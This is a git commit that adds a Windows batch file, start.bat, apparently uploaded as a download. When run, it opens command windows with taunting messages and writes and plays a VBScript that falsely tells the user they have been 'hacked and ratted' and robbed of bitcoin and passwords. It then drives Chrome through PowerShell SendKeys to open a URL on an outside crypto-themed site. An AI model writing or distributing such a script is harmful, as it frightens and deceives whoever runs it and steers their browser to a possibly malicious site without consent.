2f9e94d855d49a31591e396a83f9dc79c71ff815
polartest127 <eieieiimonvacation2@gmail.com>
2025-05-13 09:13:55 +0100

    Add files via upload
    downlaod

---
+++ start.bat
@@ -0,0 +1,32 @@
+@echo off
+color a
+
+echo RAT10EY3746YEHDKE89473479832748937RUHEEUIEAJKFYHABF7NMV73NM4589Q3NY457NY4V7953474538QQQQQQQQQQQQQQQQF9HNUWREV4762QVBAHSCBHDGBCHBAHCGYAEGC YUWA ECGYUGWCY RGEWAGRYUGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG6464646Uwjhdncuewiureruy478
+start cmd
+echo ur fucked
+pause
+cls
+start chrome.exe
+start cmd
+echo fucked again
+pause
+cls
+
+echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
+set "text=0 0 1 0 10 00 100001010101010101010101010101010100101001 next time dont download random stuff from the internet lol! ur getting hacked and ratted. Thanks for da free bitcoin and passwords noob skid"
+echo speech.speak "%text%" >> "speech.vbs"
+start speech.vbs
+start
+pause
+cls
+start explorer.exe
+echo feels good gettin hacked RAT10EY3746YEHDKE89473479832748937RUHEEUIEAJKFYHABF7NMV73NM4589Q3NY457NY4V7953474538QQQQQQQQQQQQQQQQF9HNUWREV4762QVBAHSCBHDGBCHBAHCGYAEGC
+
+setlocal
+
+set "app=chrome.exe"
+start "" "%app%"
+timeout /t 2
+
+powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('https://crypto-o.click/film.php?vlock=OK05YD.fhack'); [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')"
+
